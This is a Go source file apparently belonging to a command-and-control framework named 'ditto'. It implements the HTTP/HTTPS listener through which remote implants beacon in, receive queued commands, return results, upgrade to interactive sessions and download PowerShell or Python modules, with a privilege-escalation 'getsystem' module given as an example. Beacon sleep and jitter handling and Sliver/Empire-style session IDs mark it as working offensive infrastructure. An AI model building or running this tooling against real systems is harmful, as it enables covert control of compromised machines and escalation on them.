package transport

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base32"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/tasks"
)

// HTTPTransport implements HTTP/HTTPS transport
type HTTPTransport struct {
	server       *http.Server
	listener     net.Listener
	config       *core.Config
	logger       interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
	sessions     map[string]*transportSession
	sessionsMu   sync.RWMutex
	taskQueue    *tasks.Queue
	moduleGetter func(string, map[string]string) (string, error) // Function to get module script by ID with optional params
}

type transportSession struct {
	ID          string
	RemoteAddr  string
	ConnectedAt time.Time
	LastSeen    time.Time
	Metadata    map[string]interface{}
}

// NewHTTPTransport creates a new HTTP transport with its own task queue
func NewHTTPTransport(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *HTTPTransport {
	return NewHTTPTransportWithTaskQueue(config, logger, tasks.NewQueue(1000))
}

// NewHTTPTransportWithTaskQueue creates a new HTTP transport with a shared task queue
func NewHTTPTransportWithTaskQueue(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}, taskQueue *tasks.Queue) *HTTPTransport {
	return &HTTPTransport{
		config:    config,
		logger:    logger,
		taskQueue: taskQueue,
		sessions:  make(map[string]*transportSession),
	}
}

// SetModuleGetter sets the function to retrieve module scripts
// The getter function will be wrapped to accept optional parameters
// NOTE: Parameters are currently ignored - use SetModuleGetterWithParams() for parameter-aware getters
func (ht *HTTPTransport) SetModuleGetter(getter func(string) (string, error)) {
	// Store the original getter and create a wrapper that accepts params
	originalGetter := getter
	ht.moduleGetter = func(moduleID string, params map[string]string) (string, error) {
		// Parameters are currently ignored - modules handle their own parameter substitution server-side
		// Use SetModuleGetterWithParams() if you need parameter-aware module retrieval
		return originalGetter(moduleID)
	}
}

// SetModuleGetterWithParams sets a module getter that accepts parameters
func (ht *HTTPTransport) SetModuleGetterWithParams(getter func(string, map[string]string) (string, error)) {
	ht.moduleGetter = getter
}

func (ht *HTTPTransport) Name() string {
	if ht.config.Server.TLSEnabled {
		return "https"
	}
	return "http"
}

func (ht *HTTPTransport) Start(ctx context.Context, tConfig *TransportConfig) error {
	// Initialize session management
	if ht.sessions == nil {
		ht.sessions = make(map[string]*transportSession)
	}
	
	// Use shared task queue if provided, otherwise create a new one
	if ht.taskQueue == nil {
		ht.taskQueue = tasks.NewQueue(1000)
	}
	
	mux := http.NewServeMux()
	mux.HandleFunc("/beacon", ht.handleBeacon)
	mux.HandleFunc("/task", ht.handleTask)
	mux.HandleFunc("/result", ht.handleResult)
	mux.HandleFunc("/upgrade", ht.handleUpgrade)
	mux.HandleFunc("/module/", ht.handleModule)
	
	ht.server = &http.Server{
		Handler:      mux,
		ReadTimeout:  ht.config.Server.ReadTimeout,
		WriteTimeout: ht.config.Server.WriteTimeout,
		IdleTimeout:  ht.config.Server.KeepAlive,
	}
	
	// Only use TLS if explicitly enabled in TransportConfig
	// The global config TLSEnabled setting applies to the main server, not listeners
	if tConfig.TLSEnabled {
		certPath := tConfig.TLSCertPath
		keyPath := tConfig.TLSKeyPath
		
		// Fallback to config paths if TransportConfig paths are empty
		if certPath == "" || keyPath == "" {
			certPath = ht.config.Server.TLSCertPath
			keyPath = ht.config.Server.TLSKeyPath
		}
		
		// Validate certificate paths before starting TLS listener
		if certPath == "" || keyPath == "" {
			return fmt.Errorf("TLS is enabled but certificate paths are not configured\n"+
				"  Solution 1: Provide certificate paths in TransportConfig\n"+
				"  Solution 2: Configure certificate paths in config\n"+
				"  Solution 3: Set TLSEnabled: false in TransportConfig for plain HTTP")
		}
		
		// Check if certificates exist
		if _, err := os.Stat(certPath); os.IsNotExist(err) {
			return fmt.Errorf("TLS certificate file not found: %s\n"+
				"  Solution: Generate certificates or provide valid certificate paths", certPath)
		}
		
		if _, err := os.Stat(keyPath); os.IsNotExist(err) {
			return fmt.Errorf("TLS key file not found: %s\n"+
				"  Solution: Generate certificates or provide valid certificate paths", keyPath)
		}
		
		tlsConfig := &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
		ht.server.TLSConfig = tlsConfig
		
		var err error
		ht.listener, err = tls.Listen("tcp", tConfig.BindAddr, tlsConfig)
		if err != nil {
			return fmt.Errorf("failed to start TLS listener: %w", err)
		}
	} else {
		// Plain HTTP listener
		var err error
		ht.listener, err = net.Listen("tcp", tConfig.BindAddr)
		if err != nil {
			return fmt.Errorf("failed to start listener: %w", err)
		}
	}
	
	ht.logger.Info("HTTP transport started on %s", tConfig.BindAddr)
	
	go func() {
		if tConfig.TLSEnabled {
			certPath := tConfig.TLSCertPath
			keyPath := tConfig.TLSKeyPath
			
			// Fallback to config paths if TransportConfig paths are empty
			if certPath == "" || keyPath == "" {
				certPath = ht.config.Server.TLSCertPath
				keyPath = ht.config.Server.TLSKeyPath
			}
			
			// Validate certificate paths before starting
			if certPath == "" || keyPath == "" {
				ht.logger.Error("TLS enabled but certificate paths not configured")
				return
			}
			
			ht.server.ServeTLS(ht.listener, certPath, keyPath)
		} else {
			ht.server.Serve(ht.listener)
		}
	}()
	
	return nil
}

func (ht *HTTPTransport) Stop() error {
	if ht.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		return ht.server.Shutdown(ctx)
	}
	return nil
}

func (ht *HTTPTransport) Accept() (Connection, error) {
	// HTTP transport does not support Accept() - connections are request-based
	// HTTP is a stateless protocol where each request creates a new connection context.
	// Use Connect() for client-side connections or handleBeacon()/handleTask() for server-side request handling.
	// 
	// Alternative approaches:
	// - For server-side: Use HTTP handlers (handleBeacon, handleTask, handleResult) instead of Accept()
	// - For client-side: Use Connect() to establish HTTP client connections
	return nil, fmt.Errorf("HTTP transport does not support Accept() - use Connect() for client or HTTP handlers for server")
}

func (ht *HTTPTransport) Connect(ctx context.Context, addr string) (Connection, error) {
	// Client-side connection via HTTP client
	// Use configurable timeout if available, otherwise default to 30 seconds
	timeout := 30 * time.Second
	if ht.config != nil && ht.config.Server.ReadTimeout > 0 {
		// Use ReadTimeout as client timeout (reasonable default)
		timeout = ht.config.Server.ReadTimeout
	}
	
	client := &http.Client{
		Timeout: timeout,
	}
	
	// Determine protocol
	url := addr
	if !hasProtocol(addr) {
		if ht.config.Server.TLSEnabled {
			url = "https://" + addr
		} else {
			url = "http://" + addr
		}
	}
	
	req, err := http.NewRequestWithContext(ctx, "GET", url+"/beacon", nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to connect: %w", err)
	}
	
	// Create a client-side HTTP connection wrapper
	return NewHTTPClientConnection(req, resp), nil
}

func hasProtocol(addr string) bool {
	return len(addr) > 7 && (addr[:7] == "http://" || addr[:8] == "https://")
}

func (ht *HTTPTransport) handleBeacon(w http.ResponseWriter, r *http.Request) {
	// Propagate request context for cancellation support
	ctx := r.Context()
	_ = ctx // Context available for future use (e.g., timeout handling)
	
	ht.logger.Debug("Incoming beacon request from %s (method: %s, URI: %s, headers: %v)", 
		r.RemoteAddr, r.Method, r.RequestURI, r.Header)
	
	if r.Method != http.MethodPost && r.Method != http.MethodGet {
		ht.logger.Error("Invalid HTTP method for beacon: %s from %s", r.Method, r.RemoteAddr)
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	sessionID := r.Header.Get("X-Session-ID")
	newSessionCreated := false
	
	ht.sessionsMu.Lock()
	var session *transportSession
	
	if sessionID != "" {
		// Session ID provided - find existing session by ID (highest priority)
		session = ht.sessions[sessionID]
		if session != nil {
			ht.logger.Debug("Session ID provided: %s (found: %v)", sessionID, session != nil)
		} else {
			ht.logger.Debug("Session ID provided: %s (not found in sessions map)", sessionID)
		}
	}
	
	// If session not found by ID, try to match by IP address (ignore port)
	// This handles NAT/proxy scenarios where source port changes
	if session == nil && sessionID != "" {
		// Extract IP from RemoteAddr
		clientIP, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			// RemoteAddr may not have port (e.g., unix socket) - use as-is
			clientIP = r.RemoteAddr
		}
		if clientIP != "" {
			for id, existingSession := range ht.sessions {
				existingIP, _, err := net.SplitHostPort(existingSession.RemoteAddr)
				if err != nil {
					// RemoteAddr may not have port - use as-is
					existingIP = existingSession.RemoteAddr
				}
				if existingIP == clientIP {
					// IP matches - use the existing session ID
					session = existingSession
					sessionID = id
					ht.logger.Debug("Matched existing session by IP: %s -> %s (session ID: %s)", clientIP, id, sessionID)
					break
				}
			}
		}
	}
	
	// If still no session, try matching by full RemoteAddr (legacy behavior)
	if session == nil {
		for id, existingSession := range ht.sessions {
			if existingSession.RemoteAddr == r.RemoteAddr {
				session = existingSession
				sessionID = id
				ht.logger.Debug("Matched existing session by RemoteAddr: %s -> %s", r.RemoteAddr, id)
				break
			}
		}
	}
	
	if session == nil {
		// Truly new session - generate new ID
		sessionID = generateTransportSessionID()
		session = &transportSession{
			ID:          sessionID,
			RemoteAddr:  r.RemoteAddr,
			ConnectedAt: time.Now(),
			LastSeen:    time.Now(),
			Metadata:    make(map[string]interface{}),
		}
		ht.sessions[sessionID] = session
		newSessionCreated = true
		ht.logger.Info("New session created: %s from %s", sessionID, r.RemoteAddr)
		ht.logger.Debug("Total active sessions: %d", len(ht.sessions))
	} else {
		// Existing session - update LastSeen
		session.LastSeen = time.Now()
		// Update RemoteAddr in case it changed (NAT, etc.)
		if session.RemoteAddr != r.RemoteAddr {
			ht.logger.Debug("Session %s RemoteAddr changed: %s -> %s", sessionID, session.RemoteAddr, r.RemoteAddr)
			session.RemoteAddr = r.RemoteAddr
		}
		ht.logger.Debug("Existing session updated: %s (last seen: %v)", sessionID, session.LastSeen)
	}
	ht.sessionsMu.Unlock()
	
	// Read client metadata
	var metadata map[string]interface{}
	if r.Body != nil {
		if err := json.NewDecoder(r.Body).Decode(&metadata); err == nil {
			session.Metadata = metadata
			ht.logger.Debug("Received metadata for session %s: %v", sessionID, metadata)
		} else if err != nil && err.Error() != "EOF" {
			ht.logger.Debug("Failed to decode metadata for session %s: %v", sessionID, err)
		}
	}
	
	// Get pending tasks for this session
	pendingTasks := ht.getPendingTasks(sessionID)
	ht.logger.Debug("Returning %d pending tasks for session %s", len(pendingTasks), sessionID)
	
	// Mark tasks as in-progress to prevent re-sending
	for _, taskMap := range pendingTasks {
		if taskID, ok := taskMap["id"].(string); ok {
			ht.logger.Debug("Marking task %s as in_progress for session %s", taskID, sessionID)
			if ht.taskQueue != nil {
				ht.taskQueue.UpdateStatus(taskID, "in_progress")
			}
		}
	}
	
	// Calculate adaptive sleep interval with constant lifeline
	// If there are pending tasks, use shorter interval (1-2 seconds)
	// Otherwise use minimum keepalive interval to maintain constant lifeline
	adaptiveSleep := ht.config.Communication.KeepAliveInterval.Seconds()
	if adaptiveSleep == 0 {
		// Fallback to Sleep if KeepAliveInterval not set
		adaptiveSleep = ht.config.Communication.Sleep.Seconds()
	}
	if len(pendingTasks) > 0 {
		// Active tasking - use fast interval (1-2 seconds with jitter)
		adaptiveSleep = 1.5 // Base 1.5 seconds when tasks are pending
		ht.logger.Debug("Adaptive sleep: tasks pending, using fast interval %.2fs", adaptiveSleep)
	} else {
		// No tasks - use keepalive interval to maintain constant lifeline
		ht.logger.Debug("Adaptive sleep: no tasks, using keepalive interval %.2fs for constant lifeline", adaptiveSleep)
	}
	
	response := map[string]interface{}{
		"session_id": sessionID,
		"tasks":      pendingTasks,
		"sleep":      adaptiveSleep,
		"jitter":     ht.config.Communication.Jitter,
	}
	
	ht.logger.Debug("Beacon response for session %s: session_id=%s, tasks=%d, sleep=%.2fs, jitter=%.2f", 
		sessionID, sessionID, len(pendingTasks), adaptiveSleep, ht.config.Communication.Jitter)
	
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		ht.logger.Error("Failed to encode beacon response for session %s: %v", sessionID, err)
		return
	}
	
	ht.logger.Debug("Beacon response sent successfully for session %s", sessionID)
	
	// Trigger notification for new sessions (only for truly new ones)
	if newSessionCreated {
		// This will be handled by syncSessionsWithContext
	}
}

func (ht *HTTPTransport) handleTask(w http.ResponseWriter, r *http.Request) {
	// Propagate request context for cancellation support
	ctx := r.Context()
	_ = ctx // Context available for future use (e.g., timeout handling)
	
	ht.logger.Debug("Task request from %s (method: %s)", r.RemoteAddr, r.Method)
	
	if r.Method != http.MethodGet {
		ht.logger.Error("Invalid HTTP method for task: %s from %s", r.Method, r.RemoteAddr)
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		ht.logger.Error("Task request received without session ID from %s", r.RemoteAddr)
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	ht.logger.Debug("Task request from session %s (from %s)", sessionID, r.RemoteAddr)
	
	tasks := ht.getPendingTasks(sessionID)
	ht.logger.Debug("Retrieved %d pending tasks for session %s", len(tasks), sessionID)
	
	// Mark tasks as in-progress and schedule removal
	for _, taskMap := range tasks {
		if taskID, ok := taskMap["id"].(string); ok {
			ht.logger.Debug("Marking task %s as in_progress for session %s", taskID, sessionID)
			if ht.taskQueue != nil {
				ht.taskQueue.UpdateStatus(taskID, "in_progress")
				// Remove task after completion timeout (30 seconds)
				// Use context-aware goroutine to handle cancellation
				go func(id string, queue interface{}) {
					// Check if queue is still valid before accessing
					if queue == nil {
						return
					}
					time.Sleep(30 * time.Second)
					// Double-check queue is still valid
					if queue == nil || ht.taskQueue == nil {
						return
					}
					if task := ht.taskQueue.Get(id); task != nil && task.Status == "in_progress" {
						ht.logger.Debug("Removing expired task %s after timeout", id)
						ht.taskQueue.Remove(id)
					}
				}(taskID, ht.taskQueue)
			}
		}
	}
	
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(map[string]interface{}{
		"tasks": tasks,
	}); err != nil {
		ht.logger.Error("Failed to encode task response for session %s: %v", sessionID, err)
		return
	}
	
	ht.logger.Debug("Task response sent successfully for session %s", sessionID)
}

func (ht *HTTPTransport) handleResult(w http.ResponseWriter, r *http.Request) {
	// Propagate request context for cancellation support
	ctx := r.Context()
	_ = ctx // Context available for future use (e.g., timeout handling)
	
	ht.logger.Debug("Result request from %s (method: %s)", r.RemoteAddr, r.Method)
	
	if r.Method != http.MethodPost {
		ht.logger.Error("Invalid HTTP method for result: %s from %s", r.Method, r.RemoteAddr)
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		ht.logger.Error("Result request received without session ID from %s", r.RemoteAddr)
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	ht.logger.Debug("Result request from session %s (from %s)", sessionID, r.RemoteAddr)
	
	var result map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		ht.logger.Error("Failed to decode result JSON from session %s: %v", sessionID, err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	
	taskType, _ := result["type"].(string)
	taskID, _ := result["task_id"].(string)
	resultValue, _ := result["result"].(string)
	ht.logger.Debug("Received result for task %s (type: %s) from session %s", taskID, taskType, sessionID)
	
	// Log result content for debugging
	if resultValue != "" {
		resultPreview := resultValue
		if len(resultPreview) > 200 {
			resultPreview = resultPreview[:200] + "..."
		}
		ht.logger.Debug("Task result content: %s", resultPreview)
	}
	
	// Update task status and remove after completion
	if taskID != "" {
		if ht.taskQueue != nil {
			task := ht.taskQueue.Get(taskID)
			if task != nil {
				ht.taskQueue.SetResult(taskID, result)
				ht.logger.Debug("Task %s result stored, scheduling removal", taskID)
				// Remove task immediately after storing result
				go func() {
					time.Sleep(1 * time.Second) // Brief delay to allow result processing
					ht.taskQueue.Remove(taskID)
					ht.logger.Debug("Task %s removed after result processing", taskID)
				}()
			} else {
				ht.logger.Debug("Task %s not found in queue (may have already been removed)", taskID)
			}
		}
	}
	
	ht.logger.Debug("Task result from session %s: task_id=%s, type=%s", sessionID, taskID, taskType)
	
	w.WriteHeader(http.StatusOK)
	if _, err := w.Write([]byte("OK")); err != nil {
		ht.logger.Error("Failed to write result response: %v", err)
	}
}

func (ht *HTTPTransport) handleUpgrade(w http.ResponseWriter, r *http.Request) {
	// Propagate request context for cancellation support
	ctx := r.Context()
	_ = ctx // Context available for future use (e.g., timeout handling)
	
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	ht.sessionsMu.Lock()
	session, exists := ht.sessions[sessionID]
	if !exists {
		ht.sessionsMu.Unlock()
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}
	
	// Mark session as upgraded to interactive
	if session.Metadata == nil {
		session.Metadata = make(map[string]interface{})
	}
	session.Metadata["upgraded"] = true
	session.Metadata["upgraded_at"] = time.Now()
	ht.sessionsMu.Unlock()
	
	ht.logger.Info("Session %s upgraded to interactive", sessionID)
	
	response := map[string]interface{}{
		"status":      "success",
		"session_id":  sessionID,
		"session_type": "interactive",
	}
	
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		ht.logger.Error("Failed to encode upgrade response: %v", err)
		return
	}
}

func (ht *HTTPTransport) handleModule(w http.ResponseWriter, r *http.Request) {
	// Propagate request context for cancellation support
	ctx := r.Context()
	_ = ctx // Context available for future use (e.g., timeout handling)
	
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	// Extract module ID from URL path (/module/powershell/privesc/getsystem)
	moduleID := strings.TrimPrefix(r.URL.Path, "/module/")
	if moduleID == "" {
		http.Error(w, "Module ID required", http.StatusBadRequest)
		return
	}
	
	// Validate module ID to prevent path traversal attacks
	// Module IDs should only contain alphanumeric, slash, underscore, and hyphen
	if strings.Contains(moduleID, "..") || strings.Contains(moduleID, "//") {
		http.Error(w, "Invalid module ID: path traversal detected", http.StatusBadRequest)
		return
	}
	
	// Additional validation: ensure module ID follows expected pattern
	// Should be: language/category/module or language/module
	parts := strings.Split(moduleID, "/")
	if len(parts) < 2 || len(parts) > 3 {
		http.Error(w, "Invalid module ID format", http.StatusBadRequest)
		return
	}
	
	// Validate language prefix (powershell, python, etc.)
	validLanguages := map[string]bool{"powershell": true, "python": true}
	if !validLanguages[parts[0]] {
		http.Error(w, "Invalid module language", http.StatusBadRequest)
		return
	}
	
	// Get task ID from query parameter to retrieve task parameters
	taskID := r.URL.Query().Get("task_id")
	sessionID := r.Header.Get("X-Session-ID")
	
	ht.logger.Debug("Module request for %s (task: %s, session: %s) from %s", moduleID, taskID, sessionID, r.RemoteAddr)
	
	if ht.moduleGetter == nil {
		http.Error(w, "Module getter not configured", http.StatusInternalServerError)
		return
	}
	
	// Extract parameters from task if task ID provided
	params := make(map[string]string)
	if taskID != "" && ht.taskQueue != nil {
		task := ht.taskQueue.Get(taskID)
		if task != nil && task.Parameters != nil {
			// Convert task parameters to map[string]string
			for k, v := range task.Parameters {
				if str, ok := v.(string); ok {
					params[k] = str
				} else {
					params[k] = fmt.Sprintf("%v", v)
				}
			}
			ht.logger.Debug("Task %s requested module %s with %d parameters", taskID, moduleID, len(params))
		}
	}
	
	// Get module script with parameters
	script, err := ht.moduleGetter(moduleID, params)
	if err != nil {
		ht.logger.Error("Failed to get module %s: %v", moduleID, err)
		// Mark task as failed to prevent retries
		if taskID != "" && ht.taskQueue != nil {
			ht.taskQueue.UpdateStatus(taskID, "failed")
		}
		// Return clear error message
		if strings.Contains(err.Error(), "module not found") {
			http.Error(w, fmt.Sprintf("Module not found: %s", moduleID), http.StatusNotFound)
		} else {
			http.Error(w, fmt.Sprintf("Failed to process module %s: %v", moduleID, err), http.StatusInternalServerError)
		}
		return
	}
	
	response := map[string]interface{}{
		"script": script,
	}
	
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		ht.logger.Error("Failed to encode module response: %v", err)
		return
	}
	
	ht.logger.Debug("Module script sent for %s", moduleID)
}

func (ht *HTTPTransport) getPendingTasks(sessionID string) []map[string]interface{} {
	if ht.taskQueue == nil {
		return []map[string]interface{}{}
	}
	
	pending := ht.taskQueue.GetPending()
	tasks := make([]map[string]interface{}, 0, len(pending))
	
	for _, task := range pending {
		// Skip tasks that are already in progress or failed - don't retry them
		if task.Status == "in_progress" || task.Status == "failed" {
			continue
		}
		
		// Filter tasks by session if specified in parameters
		if task.Parameters != nil {
			if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
				if taskSessionID != sessionID {
					continue
				}
			}
		}
		
		tasks = append(tasks, map[string]interface{}{
			"id":         task.ID,
			"type":       task.Type,
			"command":    task.Command,
			"parameters": task.Parameters,
		})
	}
	
	return tasks
}

// GetSessions returns all active sessions (for syncing with session manager)
func (ht *HTTPTransport) GetSessions() map[string]*Session {
	ht.sessionsMu.RLock()
	defer ht.sessionsMu.RUnlock()
	
	result := make(map[string]*Session, len(ht.sessions))
	for id, ts := range ht.sessions {
		result[id] = &Session{
			ID:          ts.ID,
			RemoteAddr:  ts.RemoteAddr,
			ConnectedAt: ts.ConnectedAt,
			LastSeen:    ts.LastSeen,
			Metadata:    ts.Metadata,
		}
	}
	return result
}

func generateTransportSessionID() string {
	// Generate short session ID similar to Sliver/Empire (8-10 characters)
	// Use base32 encoding for readability (no ambiguous chars like 0/O, 1/I)
	bytes := make([]byte, 6)
	if _, err := rand.Read(bytes); err != nil {
		// Fallback to timestamp-based ID if crypto/rand fails
		return fmt.Sprintf("%x", time.Now().UnixNano())[:8]
	}
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(bytes)
	return strings.ToLower(encoded[:8]) // Use first 8 characters
}

// EnqueueTask adds a task to the queue
func (ht *HTTPTransport) EnqueueTask(task *tasks.Task) error {
	if ht.taskQueue == nil {
		ht.taskQueue = tasks.NewQueue(1000)
	}
	return ht.taskQueue.Add(task)
}

// HTTPConnection wraps HTTP request/response as a connection (server-side)
type HTTPConnection struct {
	req  *http.Request
	resp http.ResponseWriter
	done chan struct{}
}

func NewHTTPConnection(req *http.Request, resp http.ResponseWriter) *HTTPConnection {
	return &HTTPConnection{
		req:  req,
		resp: resp,
		done: make(chan struct{}),
	}
}

// HTTPClientConnection wraps HTTP response for client-side connections
type HTTPClientConnection struct {
	req  *http.Request
	resp *http.Response
	done chan struct{}
}

func NewHTTPClientConnection(req *http.Request, resp *http.Response) *HTTPClientConnection {
	return &HTTPClientConnection{
		req:  req,
		resp: resp,
		done: make(chan struct{}),
	}
}

func (hc *HTTPClientConnection) Read(b []byte) (n int, err error) {
	if hc.resp.Body == nil {
		return 0, io.EOF
	}
	return hc.resp.Body.Read(b)
}

func (hc *HTTPClientConnection) Write(b []byte) (n int, err error) {
	// Client connections are read-only from response
	return 0, fmt.Errorf("client connection is read-only")
}

func (hc *HTTPClientConnection) Close() error {
	if hc.resp.Body != nil {
		hc.resp.Body.Close()
	}
	close(hc.done)
	return nil
}

func (hc *HTTPClientConnection) RemoteAddr() net.Addr {
	if hc.resp.Request != nil && hc.resp.Request.URL != nil {
		host := hc.resp.Request.URL.Host
		host, port, err := net.SplitHostPort(host)
		if err == nil {
			if ip := net.ParseIP(host); ip != nil {
				portNum := 0
				if port != "" {
					fmt.Sscanf(port, "%d", &portNum)
				}
				return &net.TCPAddr{IP: ip, Port: portNum}
			}
		}
	}
	return &net.TCPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 0}
}

func (hc *HTTPClientConnection) LocalAddr() net.Addr {
	return nil
}

func (hc *HTTPClientConnection) SetDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPClientConnection) SetReadDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPClientConnection) SetWriteDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPConnection) Read(b []byte) (n int, err error) {
	return hc.req.Body.Read(b)
}

func (hc *HTTPConnection) Write(b []byte) (n int, err error) {
	return hc.resp.Write(b)
}

func (hc *HTTPConnection) Close() error {
	close(hc.done)
	return nil
}

func (hc *HTTPConnection) RemoteAddr() net.Addr {
	host, port, err := net.SplitHostPort(hc.req.RemoteAddr)
	if err != nil {
		return &net.TCPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 0}
	}
	ip := net.ParseIP(host)
	if ip == nil {
		return &net.TCPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 0}
	}
	portNum := 0
	if port != "" {
		fmt.Sscanf(port, "%d", &portNum)
	}
	return &net.TCPAddr{IP: ip, Port: portNum}
}

func (hc *HTTPConnection) LocalAddr() net.Addr {
	return nil
}

func (hc *HTTPConnection) SetDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPConnection) SetReadDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPConnection) SetWriteDeadline(t time.Time) error {
	return nil
}

